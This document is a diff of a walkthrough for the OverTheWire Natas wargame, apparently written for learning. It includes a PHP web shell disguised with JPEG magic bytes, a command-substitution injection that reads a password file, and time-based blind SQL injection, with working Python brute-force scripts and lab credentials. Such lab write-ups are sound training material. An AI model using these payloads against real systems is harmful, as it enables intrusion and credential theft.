@@ -794,7 +794,12 @@ So we need to make our PHP script pretend it is an image.
 Breaking down our script into bytes we get:
 
 ```
-3C 3F 70 68 70 20 65 63 68 6F 20 70 61 73 73 74 68 72 75 28 24 5F 52 45 51 55 45 53 54 5B 22 63 6D 64 22 5D 29 3B 20 3F 3E
+3C 3F 70 68 70 20 65 63 
+68 6F 20 70 61 73 73 74 
+68 72 75 28 24 5F 52 45 
+51 55 45 53 54 5B 22 63 
+6D 64 22 5D 29 3B 20 3F 
+3E
 ```
 
 In order to add the `.jpg` magic numbers we add four characters to the beginning.
@@ -806,13 +811,23 @@ In order to add the `.jpg` magic numbers we add four characters to the beginning
 Which broken into bytes is:
 
 ```
-2E 2E 2E 2E 3C 3F 70 68 70 20 65 63 68 6F 20 70 61 73 73 74 68 72 75 28 24 5F 52 45 51 55 45 53 54 5B 22 63 6D 64 22 5D 29 3B 20 3F 3E
+2E 2E 2E 2E 3C 3F 70 68 
+70 20 65 63 68 6F 20 70 
+61 73 73 74 68 72 75 28 
+24 5F 52 45 51 55 45 53 
+54 5B 22 63 6D 64 22 5D 
+29 3B 20 3F 3E
 ```
 
 Now, we need to edit the first bytes to be `FF D8 FF DB`, getting us:
 
 ```
-FF D8 FF DB 3C 3F 70 68 70 20 65 63 68 6F 20 70 61 73 73 74 68 72 75 28 24 5F 52 45 51 55 45 53 54 5B 22 63 6D 64 22 5D 29 3B 20 3F 3E
+FF D8 FF DB 3C 3F 70 68 
+70 20 65 63 68 6F 20 70 
+61 73 73 74 68 72 75 28 
+24 5F 52 45 51 55 45 53 
+54 5B 22 63 6D 64 22 5D 
+29 3B 20 3F 3E
 ```
 
 Let's test if our script works! We can do it using `file` on Linux
@@ -1084,11 +1099,13 @@ resp = requests.get(
 
 Finally if the current character yields results, we append it to the password and do not test any more candidates for the current character index.
 
+This technique is also called [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection), since we do not get a direct response to our query!
+
 ```py
 if "exists" in resp.text:
-            password += c
-            print(password)
-            break
+    password += c
+    print(password)
+    break
 ```
 
 Run the script and in no time you'll have your dear password for the next level!
@@ -1113,3 +1130,203 @@ for _ in range(32):
 ```
 
 # Level 16
+
+This level is the bigger brother of Level 9. Now they have sanitization! 
+Is it that scary? Let's see.
+
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+
+They are using a [regex](https://en.wikipedia.org/wiki/Regular_expression) to filter out strings.
+
+*For the readers who don't know what regexes are, I highly sugest you read the above link and research on the topic, it will surely come in handy at some point in your life!*
+
+The regex (```[;|&\`\'"]```) filters out the following characters:
+
+- ; - semi-colon
+- | - pipe
+- & - ampersand
+- ` - backtick
+- ' - quote
+- " - double-quote
+
+So we can't really escape the command and do whatever we want, what should we do?
+
+Bash [command substituion](https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html) to the rescue!
+
+The bash documentation states:
+
+*Command substitution allows the output of a command to replace the command itself.*
+
+How is this useful you ask? We can run a command before `grep` runs!
+
+This means we can pick a unique word from the list (which we can see using `.*`, more regex magic!),
+run a command substitution and get some output, or not!
+
+For example, the query command is:
+
+```bash
+grep -i "some key" dictionary.txt
+```
+
+If we use command substitution we can do the following:
+
+```bash
+grep -i "weird word ${grep "password character" /etc/natas_webpass/natas17}" dictionary.txt
+```
+
+If the substitution works it will return text, appending it to `weird word`, making it not match any text!
+we just need to watch out for empty results to know whether the character belongs in the password or not.
+
+Since we've covered brute force attacks, I'll just show the code. 
+The idea is the same as last time, the script just needs a bit of tweaking for the new "query".
+
+```py
+import string
+import requests
+
+url = "http://natas16.natas.labs.overthewire.org/index.php?debug&needle="
+password = ""
+candidates = f"{string.ascii_letters}{string.digits}"
+
+query = "acknowledgements$(grep ^{} /etc/natas_webpass/natas17)"
+for _ in range(32):
+    for c in candidates:
+        resp = requests.get(
+            url + query.format(password + c),
+            auth=("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"),
+        )
+        if "acknowledgements" not in resp.text:
+            password += c
+            print(password)
+            break
+```
+
+I picked `acknowledgements`, no real reason besides being unique and long.
+The script works just like Level 15. 
+Test characters and add them to the password, in no time you'll be done.
+
+# Level 17
+
+*Disclaimer: If you're here because you're stuck, have no shame, for I also went and read up on the solution. It is not trivial for those starting to learn, so do not beat yourself up!*
+
+Level 17 mixes Level 15 and 16, in that we will be doing more blind injections and that we can only check for existence.
+
+In fact, this is so blind that we don't even have output, take a look at the source code!
+
+```php
+<?
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas17', '<censored>');
+    mysql_select_db('natas17', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+        if(mysql_num_rows($res) > 0) {
+            //echo "This user exists.<br>";
+        } else {
+            //echo "This user doesn't exist.<br>";
+        }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?> 
+```
+
+All `echo` calls are commented! How will we be able to know when the characters match?
+
+As usual, OWASP as got our back! [Timing-Based Attacks](https://www.owasp.org/images/a/a5/2018-02-05-AhmadAshraff.pdf) FTW!
+
+"Uhhhh, what is that?" you might ask!
+
+---
+
+*Timing attack is a [side channel attack](https://www.owasp.org/images/c/cd/Side_Channel_Vulnerabilities.pdf) which allows an attacker to retrieve potentially sensitive information from the web applications by observing the normal behavior of the response times.*
+
+---
+
+"I'm sold, how do we get started?"
+
+With a SQL injection as usual! We get our usual query.
+
+```sql
+SELECT * FROM users WHERE username="natas18" AND password LIKE BINARY "%"
+```
+
+But we'll be adding a secret ingredient, if you read [this](https://www.owasp.org/images/a/a5/2018-02-05-AhmadAshraff.pdf#page=9) you know what it is, we will be using [`SLEEP`](https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep).
+
+What we want to do is to force correct queries to sleep for a given period of time, if the response takes at least that time to arrive it is because it most likely you have a hit (beware of network delays!).
+
+Our query now looks like:
+
+```sql
+SELECT * FROM users WHERE username="natas18" AND password LIKE BINARY "%" AND SLEEP(1)
+```
+
+*Note: we now have a dangling `"`, you can add `#` in order to comment it out from the query! Do not forget to URL encode it though!.*
+
+Once more we need to adapt our little brute force script (maybe we could generalize it)?
+
+[![The General Problem](https://imgs.xkcd.com/comics/the_general_problem.png)](https://www.xkcd.com/974/)
+
+At this point you should be tired of writing these and already be able to do it from memory, 
+or not, I'm not the one who should be doing the judgement.
+The code ends up looking like this:
+
+```py
+import string
+import requests
+import time
+
+url = "http://natas17.natas.labs.overthewire.org/index.php?debug&username="
+password = ""
+candidates = f"{string.digits}{string.ascii_letters}"
+
+query = 'natas18" AND password LIKE BINARY "{}%" AND SLEEP(1)%23'
+for _ in range(32):
+    for c in candidates:
+        sent = time.time()
+        resp = requests.get(
+            url + query.format(password + c),
+            auth=("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"),
+        )
+        elapsed = time.time() - sent
+        if elapsed > 1:
+            password += c
+            print(password)
+            break
+```
+
+The new addition is the time calculation:
+
+```py
+sent = time.time()
+elapsed = time.time() - sent
+```
+
+Nothing major or relevant, if you're curious, check the [documentation](https://docs.python.org/3.8/library/time.html)!
+
+Once more in no time, you'll have the password!
